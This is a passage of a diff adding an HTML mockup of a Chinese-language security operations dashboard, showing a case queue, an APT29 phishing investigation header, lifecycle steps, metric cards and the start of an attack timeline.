@@ -1,0 +1,1492 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SOC Copilot Sentinel | 安全事件与案件工单中心</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            cyber: {
+              bg: '#080C14',
+              surface: '#0D131F',
+              card: '#131B2E',
+              cardHover: '#18243D',
+              border: '#1E293B',
+              borderLight: '#334155',
+              accent: '#38BDF8',
+              primary: '#2563EB',
+              crimson: '#EF4444',
+              amber: '#F59E0B',
+              emerald: '#10B981',
+              cyan: '#06B6D4'
+            }
+          },
+          fontFamily: {
+            sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'sans-serif'],
+            mono: ['JetBrains Mono', 'Fira Code', 'Courier New', 'monospace']
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    /* 核心样式重置与深色防御调优 */
+    :root {
+      --bg: #080C14;
+      --surface: #0D131F;
+      --card: #131B2E;
+      --border: #1E293B;
+      --accent: #38BDF8;
+      --crimson: #EF4444;
+      --emerald: #10B981;
+      --amber: #F59E0B;
+    }
+    body {
+      background-color: var(--bg);
+      color: #F1F5F9;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+      overflow: hidden;
+      user-select: none;
+    }
+    /* 自定义细微滚动条 */
+    ::-webkit-scrollbar {
+      width: 5px;
+      height: 5px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #080C14;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #1E293B;
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #334155;
+    }
+    /* 脉冲光晕与高科技发光动画 */
+    @keyframes pulse-glow {
+      0%, 100% { opacity: 1; transform: scale(1); filter: drop-shadow(0 0 8px rgba(239, 68, 68, 0.6)); }
+      50% { opacity: 0.55; transform: scale(1.05); filter: drop-shadow(0 0 16px rgba(239, 68, 68, 0.9)); }
+    }
+    .animate-pulse-glow {
+      animation: pulse-glow 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+    @keyframes subtle-scan {
+      0% { transform: translateY(-100%); }
+      100% { transform: translateY(1000%); }
+    }
+    .scanning-line {
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, rgba(56, 189, 248, 0.4), transparent);
+      animation: subtle-scan 8s linear infinite;
+      pointer-events: none;
+    }
+    .hairline-border {
+      border: 1px solid rgba(51, 65, 85, 0.65);
+    }
+    .cyber-glass {
+      background: rgba(19, 27, 46, 0.88);
+      backdrop-filter: blur(12px);
+    }
+  </style>
+</head>
+<body class="h-screen w-screen flex flex-col text-slate-200 antialiased relative">
+
+  <!-- ==================== 1. 全局系统顶部状态与案件导航条 ==================== -->
+  <header class="h-14 bg-[#0B111E] border-b border-slate-800/80 px-4 flex items-center justify-between shrink-0 z-30 select-none" data-od-id="global-header">
+    <!-- 左侧品牌与全局上下文 -->
+    <div class="flex items-center space-x-3">
+      <div class="flex items-center space-x-2.5">
+        <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-600 to-cyan-500 p-0.5 flex items-center justify-center shadow-lg shadow-blue-500/20">
+          <svg class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            <path d="M9 12l2 2 4-4"/>
+          </svg>
+        </div>
+        <div class="flex flex-col">
+          <div class="flex items-center space-x-2">
+            <span class="font-bold text-sm tracking-wider text-white">SENTINEL</span>
+            <span class="text-[10px] font-mono uppercase px-1.5 py-0.5 rounded bg-blue-500/10 text-cyan-400 border border-blue-500/30">SOC Copilot</span>
+          </div>
+          <span class="text-[10px] text-slate-400 font-mono">v4.2.0-ENTERPRISE-PRO</span>
+        </div>
+      </div>
+
+      <div class="h-5 w-[1px] bg-slate-800 mx-1"></div>
+
+      <!-- 当前选定案件快捷面板路径 -->
+      <div class="flex items-center space-x-2 text-xs">
+        <span class="text-slate-400">案件工单中心</span>
+        <span class="text-slate-600">/</span>
+        <div class="flex items-center space-x-2 px-2 py-1 rounded bg-slate-900/90 border border-slate-700/60 text-slate-200">
+          <span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>
+          <span class="font-mono font-semibold text-red-400">CASE-20260930-0418</span>
+          <span class="text-slate-400 font-normal">| APT29 供应链钓鱼投递与凭据横向渗透调查</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- 中间：实时遥测流水线与全局威胁级别 -->
+    <div class="hidden xl:flex items-center space-x-4">
+      <div class="flex items-center space-x-2 bg-slate-900/80 px-3 py-1 rounded-md border border-slate-800/80 text-xs">
+        <span class="text-slate-400 font-mono flex items-center gap-1.5">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
+          实时遥测流:
+        </span>
+        <span id="telemetryTicker" class="text-slate-300 font-mono text-[11px] truncate max-w-[340px]">
+          [10:48:00] host-fin-04 EDR 隔离生效 · 阻断 C2: 185.220.101.45
+        </span>
+      </div>
+
+      <!-- 威胁防备级别仪表 -->
+      <div class="flex items-center space-x-2 px-2.5 py-1 rounded-md bg-red-950/40 border border-red-800/50 text-red-300 text-xs">
+        <span class="font-bold font-mono tracking-wide">DEFCON 2</span>
+        <span class="text-[11px] text-red-400">高度戒备态</span>
+      </div>
+    </div>
+
+    <!-- 右侧：环境模式、全局指令搜索、分析师信息 -->
+    <div class="flex items-center space-x-3">
+      <!-- 生产/演练切换 -->
+      <div class="flex items-center bg-slate-950 p-0.5 rounded-lg border border-slate-800 text-xs font-mono">
+        <button class="px-2.5 py-1 rounded-md bg-blue-600 text-white font-medium flex items-center space-x-1 shadow-sm">
+          <span class="w-1.5 h-1.5 rounded-full bg-cyan-300"></span>
+          <span>LIVE 生产防护</span>
+        </button>
+        <button class="px-2.5 py-1 rounded-md text-slate-400 hover:text-slate-200">
+          <span>SIM 仿真演练</span>
+        </button>
+      </div>
+
+      <!-- 全局指令快捷键 Cmd + K -->
+      <button onclick="toggleCommandPalette()" class="flex items-center space-x-2 px-3 py-1.5 rounded-lg bg-slate-900 border border-slate-700/80 text-xs text-slate-300 hover:border-slate-500 transition-colors">
+        <svg class="w-3.5 h-3.5 text-slate-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+        <span>快速研判指令</span>
+        <kbd class="px-1.5 py-0.5 rounded bg-slate-800 text-[10px] text-slate-400 font-mono border border-slate-700">⌘K</kbd>
+      </button>
+
+      <div class="h-5 w-[1px] bg-slate-800"></div>
+
+      <!-- 负责分析师 -->
+      <div class="flex items-center space-x-2">
+        <div class="w-7 h-7 rounded-full bg-slate-800 border border-cyan-500/40 flex items-center justify-center font-mono text-xs font-bold text-cyan-300">
+          AZ
+        </div>
+        <div class="hidden md:flex flex-col text-left">
+          <span class="text-xs font-medium text-slate-200">Alex Zhao (L3)</span>
+          <span class="text-[10px] text-emerald-400 flex items-center gap-1 font-mono">
+            <span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> 值班排查中
+          </span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- ==================== 2. 三栏式主体工作区 ==================== -->
+  <div class="flex-1 flex overflow-hidden relative" data-od-id="case-workspace-layout">
+
+    <!-- ----------------- [左栏] 案件工单列表与阶段漏斗 (310px) ----------------- -->
+    <aside class="w-[310px] bg-[#0A0F1A] border-r border-slate-800/80 flex flex-col shrink-0 select-none z-10" data-od-id="case-queue-sidebar">
+      <!-- 列表标题与新增工单 -->
+      <div class="p-3 border-b border-slate-800/70 flex items-center justify-between">
+        <div class="flex items-center space-x-2">
+          <svg class="w-4 h-4 text-cyan-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+            <polyline points="14 2 14 8 20 8"/>
+            <line x1="16" y1="13" x2="8" y2="13"/>
+            <line x1="16" y1="17" x2="8" y2="17"/>
+            <polyline points="10 9 9 9 8 9"/>
+          </svg>
+          <span class="text-xs font-bold uppercase tracking-wider text-slate-200">案件工单队列</span>
+          <span class="text-[11px] px-1.5 py-0.2 rounded-full bg-slate-800 text-slate-300 font-mono font-medium">18</span>
+        </div>
+        <button onclick="showToast('已开启新建协同安全案件工单抽屉', 'info')" class="p-1 rounded hover:bg-slate-800 text-slate-400 hover:text-slate-200 transition-colors" title="新建工单">
+          <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+        </button>
+      </div>
+
+      <!-- 阶段漏斗快速筛选 Pill -->
+      <div class="p-2.5 border-b border-slate-800/60 bg-slate-900/40">
+        <div class="text-[10px] text-slate-400 font-medium mb-1.5 uppercase tracking-wider">处置生命周期漏斗</div>
+        <div class="grid grid-cols-3 gap-1 text-[11px] font-mono">
+          <button class="py-1 px-1.5 rounded bg-blue-600/20 text-cyan-300 border border-blue-500/40 font-medium text-center hover:bg-blue-600/30">
+            全部 (18)
+          </button>
+          <button class="py-1 px-1.5 rounded bg-slate-800/60 text-amber-300 border border-slate-700/60 text-center hover:bg-slate-800">
+            进行中 (5)
+          </button>
+          <button class="py-1 px-1.5 rounded bg-red-950/40 text-red-300 border border-red-800/40 text-center hover:bg-red-900/40">
+            遏制中 (2)
+          </button>
+          <button class="py-1 px-1.5 rounded bg-slate-800/60 text-slate-300 border border-slate-700/60 text-center hover:bg-slate-800">
+            待复盘 (4)
+          </button>
+          <button class="py-1 px-1.5 rounded bg-slate-800/60 text-emerald-400 border border-slate-700/60 text-center hover:bg-slate-800 col-span-2">
+            已结单关闭 (7)
+          </button>
+        </div>
+      </div>
+
+      <!-- 搜索与紧迫度过滤 -->
+      <div class="px-2.5 py-2 border-b border-slate-800/60 flex items-center space-x-2">
+        <div class="relative flex-1">
+          <input type="text" placeholder="过滤工单编号 / IOC / 资产..." class="w-full bg-slate-900/90 border border-slate-800 rounded-md py-1 pl-7 pr-2 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500">
+          <svg class="w-3.5 h-3.5 text-slate-500 absolute left-2 top-2" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+        </div>
+        <button class="px-2 py-1 rounded bg-red-950/50 border border-red-800/60 text-red-400 text-[11px] font-mono flex items-center space-x-1 shrink-0" title="过滤高危 SLA 预警案件">
+          <span class="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse"></span>
+          <span>SLA &lt;1h</span>
+        </button>
+      </div>
+
+      <!-- 滚动卡片列表 -->
+      <div class="flex-1 overflow-y-auto p-2 space-y-2" id="caseListContainer">
+        <!-- 卡片 1 (当前活跃工单) -->
+        <div onclick="selectCase('0418')" id="case-card-0418" class="p-2.5 rounded-lg bg-[#141F36] border-2 border-cyan-500/80 shadow-md shadow-cyan-950/40 cursor-pointer relative group transition-all">
+          <div class="absolute -left-2 top-1/2 -translate-y-1/2 w-1.5 h-8 bg-cyan-400 rounded-r"></div>
+          <div class="flex items-center justify-between mb-1.5">
+            <span class="text-xs font-mono font-bold text-cyan-300">CASE-20260930-0418</span>
+            <span class="px-1.5 py-0.5 rounded text-[10px] font-mono font-bold bg-red-500/20 text-red-400 border border-red-500/40 flex items-center gap-1">
+              <span class="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse"></span>
+              P1 致命
+            </span>
+          </div>
+          <h4 class="text-xs font-medium text-slate-100 line-clamp-2 leading-relaxed mb-2">
+            APT29 供应链钓鱼投递与凭据横向渗透调查
+          </h4>
+          <div class="flex items-center justify-between text-[11px] font-mono mb-2">
+            <span class="text-slate-400">阶段: <strong class="text-cyan-400">深入调查中</strong></span>
+            <span class="text-red-400 font-bold bg-red-950/60 px-1.5 py-0.2 rounded border border-red-800/60">
+              SLA 00:42:15
+            </span>
+          </div>
+          <div class="flex items-center justify-between text-[10px] text-slate-400 pt-1.5 border-t border-slate-700/50">
+            <div class="flex items-center space-x-1.5">
+              <span class="px-1 py-0.2 rounded bg-slate-800 text-slate-300 font-mono">8 告警</span>
+              <span class="px-1 py-0.2 rounded bg-slate-800 text-slate-300 font-mono">3 资产</span>
+            </div>
+            <span class="text-slate-400">Alex.Z · 刚刚</span>
+          </div>
+        </div>
+
+        <!-- 卡片 2 -->
+        <div onclick="selectCase('0402')" id="case-card-0402" class="p-2.5 rounded-lg bg-[#0F172A] border border-slate-800 hover:border-slate-700 cursor-pointer transition-all">
+          <div class="flex items-center justify-between mb-1.5">
+            <span class="text-xs font-mono font-bold text-slate-300">CASE-20260930-0402</span>
+            <span class="px-1.5 py-0.5 rounded text-[10px] font-mono font-bold bg-red-500/10 text-red-400 border border-red-500/20">
+              P1 致命
+            </span>
+          </div>
+          <h4 class="text-xs font-medium text-slate-300 line-clamp-2 leading-relaxed mb-2">
+            财务核心库遭遇疑似 Ransomware 加密前夕异常批量外联
+          </h4>
+          <div class="flex items-center justify-between text-[11px] font-mono mb-2">
+            <span class="text-slate-400">阶段: <strong class="text-amber-400">威胁遏制中</strong></span>
+            <span class="text-amber-400 bg-amber-950/40 px-1.5 py-0.2 rounded border border-amber-800/40">
+              SLA 02:15:30
+            </span>
+          </div>
+          <div class="flex items-center justify-between text-[10px] text-slate-400 pt-1.5 border-t border-slate-800">
+            <div class="flex items-center space-x-1.5">
+              <span class="px-1 py-0.2 rounded bg-slate-800/60 text-slate-400 font-mono">14 告警</span>
+              <span class="px-1 py-0.2 rounded bg-slate-800/60 text-slate-400 font-mono">db-fin-01</span>
+            </div>
+            <span class="text-slate-500">Sarah.L · 18m前</span>
+          </div>
+        </div>
+
+        <!-- 卡片 3 -->
+        <div onclick="selectCase('0388')" id="case-card-0388" class="p-2.5 rounded-lg bg-[#0F172A] border border-slate-800 hover:border-slate-700 cursor-pointer transition-all">
+          <div class="flex items-center justify-between mb-1.5">
+            <span class="text-xs font-mono font-bold text-slate-300">CASE-20260930-0388</span>
+            <span class="px-1.5 py-0.5 rounded text-[10px] font-mono font-bold bg-amber-500/10 text-amber-400 border border-amber-500/30">
+              P2 高危
+            </span>
+          </div>
+          <h4 class="text-xs font-medium text-slate-300 line-clamp-2 leading-relaxed mb-2">
+            Okta 身份认证异常：海外机房 IP 暴力撞库与 MFA 疲劳轰炸
+          </h4>
+          <div class="flex items-center justify-between text-[11px] font-mono mb-2">
+            <span class="text-slate-400">阶段: <strong class="text-blue-400">根除恢复</strong></span>
+            <span class="text-slate-400 font-mono">SLA 03:40:12</span>
+          </div>
+          <div class="flex items-center justify-between text-[10px] text-slate-400 pt-1.5 border-t border-slate-800">
+            <div class="flex items-center space-x-1.5">
+              <span class="px-1 py-0.2 rounded bg-slate-800/60 text-slate-400 font-mono">5 告警</span>
+              <span class="px-1 py-0.2 rounded bg-slate-800/60 text-slate-400 font-mono">IAM-Dev</span>
+            </div>
+            <span class="text-slate-500">Chen.W · 45m前</span>
+          </div>
+        </div>
+
+        <!-- 卡片 4 -->
+        <div onclick="selectCase('0371')" id="case-card-0371" class="p-2.5 rounded-lg bg-[#0F172A] border border-slate-800 hover:border-slate-700 cursor-pointer transition-all">
+          <div class="flex items-center justify-between mb-1.5">
+            <span class="text-xs font-mono font-bold text-slate-300">CASE-20260930-0371</span>
+            <span class="px-1.5 py-0.5 rounded text-[10px] font-mono font-bold bg-amber-500/10 text-amber-400 border border-amber-500/30">
+              P2 高危
+            </span>
+          </div>
+          <h4 class="text-xs font-medium text-slate-300 line-clamp-2 leading-relaxed mb-2">
+            Edge Gateway Palo Alto 防火墙 CVE-2024-3400 命令注入探测
+          </h4>
+          <div class="flex items-center justify-between text-[11px] font-mono mb-2">
+            <span class="text-slate-400">阶段: <strong class="text-cyan-400">深入调查中</strong></span>
+            <span class="text-red-400 font-bold bg-red-950/60 px-1.5 py-0.2 rounded border border-red-800/60">
+              SLA 00:18:40
+            </span>
+          </div>
+          <div class="flex items-center justify-between text-[10px] text-slate-400 pt-1.5 border-t border-slate-800">
+            <div class="flex items-center space-x-1.5">
+              <span class="px-1 py-0.2 rounded bg-slate-800/60 text-slate-400 font-mono">3 告警</span>
+              <span class="px-1 py-0.2 rounded bg-slate-800/60 text-slate-400 font-mono">FW-Edge-01</span>
+            </div>
+            <span class="text-slate-500">Alex.Z · 1h前</span>
+          </div>
+        </div>
+
+        <!-- 卡片 5 -->
+        <div onclick="selectCase('0355')" id="case-card-0355" class="p-2.5 rounded-lg bg-[#0F172A] border border-slate-800 hover:border-slate-700 cursor-pointer transition-all">
+          <div class="flex items-center justify-between mb-1.5">
+            <span class="text-xs font-mono font-bold text-slate-300">CASE-20260930-0355</span>
+            <span class="px-1.5 py-0.5 rounded text-[10px] font-mono font-bold bg-cyan-500/10 text-cyan-400 border border-cyan-500/30">
+              P3 中危
+            </span>
+          </div>
+          <h4 class="text-xs font-medium text-slate-300 line-clamp-2 leading-relaxed mb-2">
+            内部代码仓库 GitLab 偶发公网敏感密钥泄露自动化扫描告警
+          </h4>
+          <div class="flex items-center justify-between text-[11px] font-mono mb-2">
+            <span class="text-slate-400">阶段: <strong class="text-emerald-400">待复盘结单</strong></span>
+            <span class="text-slate-400 font-mono">SLA 正常</span>
+          </div>
+          <div class="flex items-center justify-between text-[10px] text-slate-400 pt-1.5 border-t border-slate-800">
+            <div class="flex items-center space-x-1.5">
+              <span class="px-1 py-0.2 rounded bg-slate-800/60 text-slate-400 font-mono">2 告警</span>
+              <span class="px-1 py-0.2 rounded bg-slate-800/60 text-slate-400 font-mono">GitLab-CI</span>
+            </div>
+            <span class="text-slate-500">SOAR-Bot · 3h前</span>
+          </div>
+        </div>
+      </div>
+    </aside>
+
+    <!-- ----------------- [中栏] 中央主体调查视区 (核心研判主工作区) ----------------- -->
+    <main class="flex-1 bg-[#080C14] flex flex-col overflow-y-auto overflow-x-hidden relative" id="investigationMain" data-od-id="case-investigation-workspace">
+      <div class="scanning-line"></div>
+
+      <!-- 工单主信息看板与上下文卡片 -->
+      <div class="p-4 border-b border-slate-800/80 bg-gradient-to-b from-[#0F172A] to-[#0A0F1D] shrink-0" data-od-id="case-hero-banner">
+        <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-3 mb-4">
+          <div>
+            <div class="flex flex-wrap items-center gap-2 mb-1.5">
+              <span class="px-2 py-0.5 rounded text-xs font-mono font-bold bg-red-500/20 text-red-400 border border-red-500/40 flex items-center gap-1.5">
+                <span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>
+                [P1 致命威胁]
+              </span>
+              <span class="px-2 py-0.5 rounded text-xs font-mono bg-blue-500/10 text-cyan-400 border border-blue-500/30">
+                APT29 (Cozy Bear / Nobelium)
+              </span>
+              <span class="px-2 py-0.5 rounded text-xs font-mono bg-slate-800 text-slate-300">
+                MITRE: T1566.001 / T1059.001 / T1003.001
+              </span>
+              <span class="text-xs text-slate-500 font-mono">创建于 2026-09-30 10:18:04 CST</span>
+            </div>
+            <h1 class="text-lg md:text-xl font-bold text-white tracking-tight flex items-center gap-2">
+              <span>APT29 供应链钓鱼投递与凭据横向渗透调查</span>
+              <span class="text-xs font-mono font-normal text-slate-400 px-2 py-0.5 bg-slate-800/70 rounded">CASE-20260930-0418</span>
+            </h1>
+          </div>
+
+          <!-- 右侧动作 -->
+          <div class="flex items-center space-x-2 shrink-0">
+            <button onclick="showToast('已复制案件加密快照链接与分享令牌', 'success')" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-medium border border-slate-700 flex items-center space-x-1.5 transition-colors">
+              <svg class="w-3.5 h-3.5 text-slate-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>
+              <span>导出证据包</span>
+            </button>
+            <button onclick="openSbarModal()" class="px-3.5 py-1.5 rounded-lg bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white text-xs font-semibold shadow-lg shadow-blue-500/25 flex items-center space-x-1.5 transition-all">
+              <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+              <span>生成 SBAR 事故调查报告</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- 处置生命周期流水线 (Stepper Bar) -->
+        <div class="bg-[#090E18] p-3 rounded-lg border border-slate-800/90 mb-3" data-od-id="lifecycle-stepper">
+          <div class="flex items-center justify-between text-xs mb-2">
+            <span class="text-slate-400 font-medium flex items-center gap-1.5">
+              <svg class="w-3.5 h-3.5 text-cyan-400" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+              SOAR 案件处置生命周期流转
+            </span>
+            <div class="flex items-center space-x-2">
+              <span class="text-[11px] text-slate-400">当前阶段：<span id="currentStageText" class="text-cyan-400 font-bold">2. 深入调查 (Investigating)</span></span>
+              <button onclick="advanceStage()" id="advanceBtn" class="px-2.5 py-1 rounded bg-blue-600/30 hover:bg-blue-600 text-cyan-300 hover:text-white border border-blue-500/40 text-[11px] font-mono font-medium flex items-center space-x-1 transition-all">
+                <span>推进至「威胁遏制」阶段</span>
+                <svg class="w-3 h-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m9 18 6-6-6-6"/></svg>
+              </button>
+            </div>
+          </div>
+
+          <!-- 步骤条视觉流 -->
+          <div class="grid grid-cols-5 gap-2 relative">
+            <!-- 步骤 1 -->
+            <div class="flex items-center space-x-2 p-2 rounded-md bg-emerald-950/30 border border-emerald-800/50">
+              <div class="w-5 h-5 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center font-mono text-[10px] font-bold border border-emerald-500/40">✓</div>
+              <div class="flex flex-col min-w-0">
+                <span class="text-[11px] font-semibold text-emerald-300 truncate">1. 检测响应</span>
+                <span class="text-[9px] text-emerald-500/80 font-mono">耗时 1.8m 完成</span>
+              </div>
+            </div>
+
+            <!-- 步骤 2 (当前) -->
+            <div id="step-node-2" class="flex items-center space-x-2 p-2 rounded-md bg-blue-950/50 border-2 border-cyan-400 shadow-md shadow-cyan-900/30">
+              <div class="w-5 h-5 rounded-full bg-cyan-500 text-slate-900 flex items-center justify-center font-mono text-[10px] font-bold animate-pulse">2</div>
+              <div class="flex flex-col min-w-0">
+                <span class="text-[11px] font-bold text-cyan-200 truncate">2. 深入调查</span>
+                <span class="text-[9px] text-cyan-400 font-mono">正在分析内存/Dump</span>
+              </div>
+            </div>
+
+            <!-- 步骤 3 -->
+            <div id="step-node-3" class="flex items-center space-x-2 p-2 rounded-md bg-slate-900/40 border border-slate-800">
+              <div class="w-5 h-5 rounded-full bg-slate-800 text-slate-400 flex items-center justify-center font-mono text-[10px] font-bold">3</div>
+              <div class="flex flex-col min-w-0">
+                <span class="text-[11px] font-medium text-slate-400 truncate">3. 威胁遏制</span>
+                <span class="text-[9px] text-slate-500 font-mono">等待复核指令</span>
+              </div>
+            </div>
+
+            <!-- 步骤 4 -->
+            <div id="step-node-4" class="flex items-center space-x-2 p-2 rounded-md bg-slate-900/40 border border-slate-800">
+              <div class="w-5 h-5 rounded-full bg-slate-800 text-slate-400 flex items-center justify-center font-mono text-[10px] font-bold">4</div>
+              <div class="flex flex-col min-w-0">
+                <span class="text-[11px] font-medium text-slate-400 truncate">4. 根除恢复</span>
+                <span class="text-[9px] text-slate-500 font-mono">策略加固与重置</span>
+              </div>
+            </div>
+
+            <!-- 步骤 5 -->
+            <div id="step-node-5" class="flex items-center space-x-2 p-2 rounded-md bg-slate-900/40 border border-slate-800">
+              <div class="w-5 h-5 rounded-full bg-slate-800 text-slate-400 flex items-center justify-center font-mono text-[10px] font-bold">5</div>
+              <div class="flex flex-col min-w-0">
+                <span class="text-[11px] font-medium text-slate-400 truncate">5. 复盘结单</span>
+                <span class="text-[9px] text-slate-500 font-mono">归档与知识库沉淀</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- 关键度量 Bento 卡片行 -->
+        <div class="grid grid-cols-2 md:grid-cols-5 gap-2.5 text-xs font-mono" data-od-id="key-metrics-bento">
+          <div class="p-2.5 rounded-lg bg-slate-900/80 border border-slate-800">
+            <div class="text-slate-400 text-[10px] uppercase">MTTA 首次响应</div>
+            <div class="text-base font-bold text-emerald-400 mt-0.5">1.8 <span class="text-xs font-normal">分钟</span></div>
+            <div class="text-[10px] text-slate-500">优于 SLA (基准 5m)</div>
+          </div>
+          <div class="p-2.5 rounded-lg bg-slate-900/80 border border-slate-800">
+            <div class="text-slate-400 text-[10px] uppercase">MTTC 遏制耗时</div>
+            <div class="text-base font-bold text-cyan-400 mt-0.5">8.2 <span class="text-xs font-normal">分钟</span></div>
+            <div class="text-[10px] text-slate-500">剧本自动化封锁</div>
+          </div>
+          <div class="p-2.5 rounded-lg bg-slate-900/80 border border-slate-800">
+            <div class="text-slate-400 text-[10px] uppercase">涉案核心资产</div>
+            <div class="text-base font-bold text-amber-400 mt-0.5">3 <span class="text-xs font-normal">台终端/服务</span></div>
+            <div class="text-[10px] text-amber-500/80">1台已完全隔离</div>
+          </div>
+          <div class="p-2.5 rounded-lg bg-slate-900/80 border border-slate-800">
+            <div class="text-slate-400 text-[10px] uppercase">提取高价值 IOC</div>
+            <div class="text-base font-bold text-red-400 mt-0.5">12 <span class="text-xs font-normal">个特征项</span></div>
+            <div class="text-[10px] text-slate-500">4 IP · 5 Hash · 3 域名</div>
+          </div>
+          <div class="p-2.5 rounded-lg bg-slate-900/80 border border-slate-800">
+            <div class="text-slate-400 text-[10px] uppercase">AI 研判置信度</div>
+            <div class="text-base font-bold text-purple-400 mt-0.5">98.4%</div>
+            <div class="text-[10px] text-purple-400/80">高危定向 APT 命中</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ----------------- 交互式攻防时间线研判流 (Timeline) ----------------- -->
+      <div class="p-4 flex-1 flex flex-col space-y-4" data-od-id="investigation-timeline-section">
+        <!-- 时间线顶部控制器 -->
+        <div class="flex flex-wrap items-center justify-between gap-2 pb-2 border-b border-slate-800/80">
+          <div class="flex items-center space-x-2">
+            <div class="w-2.5 h-2.5 rounded-full bg-cyan-400"></div>
+            <h2 class="text-sm font-bold text-white uppercase tracking-wider">事件因果演化与攻击时间线 (Interactive Attack Timeline)</h2>
+            <span class="text-xs font-mono text-slate-400 px-2 py-0.5 bg-slate-900 rounded border border-slate-800">共 5 个关键阶段节点</span>
+          </div>
+
+          <!-- 过滤器 -->
+          <div class="flex items-center space-x-1 text-xs font-mono">
+            <span class="text-slate-400 mr-1 text-[11px]">事件过滤:</span>
+            <button onclick="filterTimeline('all')" id="filter-all" class="px-2 py-1 rounded bg-blue-600 text-white font-medium">全部</button>
+            <button onclick="filterTimeline('network')" id="filter-network" class="px-2 py-1 rounded bg-slate-900 text-slate-400 hover:text-slate-200 border border-slate-800">网络外联</button>
+            <button onclick="filterTimeline('endpoint')" id="filter-endpoint" class="px-2 py-1 rounded bg-slate-900 text-slate-400 hover:text-slate-200 border border-slate-800">端点进程</button>
+            <button onclick="filterTimeline('soar')" id="filter-soar" class="px-2 py-1 rounded bg-slate-900 text-slate-400 hover:text-slate-200 border border-slate-800">SOAR 动作</button>
+            <button onclick="filterTimeline('human')" id="filter-human" class="px-2 py-1 rounded bg-slate-900 text-slate-400 hover:text-slate-200 border border-slate-800">分析师交接</button>
+          </div>
+        </div>
+
+        <!-- 纵向时序流卡片 -->
+        <div class="space-y-4 relative pl-7 before:content-[''] before:absolute before:left-3 before:top-2 before:bottom-2 before:w-0.5 before:bg-gradient-to-b before:from-red-500 before:via-cyan-500 before:to-emerald-500" id="timelineList">
+
+          <!-- 节点 1: 钓鱼邮件投递 -->
+          <div class="timeline-item relative group" data-category="endpoint" data-od-id="timeline-node-1">
+            <!-- 时序圆点 -->
+            <div class="absolute -left-7 top-1.5 w-6 h-6 rounded-full bg-red-950 border-2 border-red-500 flex items-center justify-center text-red-300 font-mono text-[10px] font-bold shadow-lg shadow-red-500/30">
+              01
+            </div>
+            <div class="p-3.5 rounded-lg bg-[#111A2E] border border-slate-800 hover:border-slate-700 transition-all">
+              <div class="flex flex-wrap items-center justify-between gap-2 mb-2">
+                <div class="flex items-center space-x-2">
+                  <span class="text-xs font-mono font-bold text-red-400">10:15:20 CST</span>
+                  <span class="px-2 py-0.5 rounded text-[11px] font-mono bg-red-500/10 text-red-300 border border-red-500/30 font-semibold">
+                    [初始访问] T1566.001 钓鱼邮件附件投递
+                  </span>
+                  <span class="px-1.5 py-0.2 rounded text-[10px] font-mono bg-slate-800 text-slate-300">资产: host-fin-04 (10.10.42.108)</span>
+                </div>
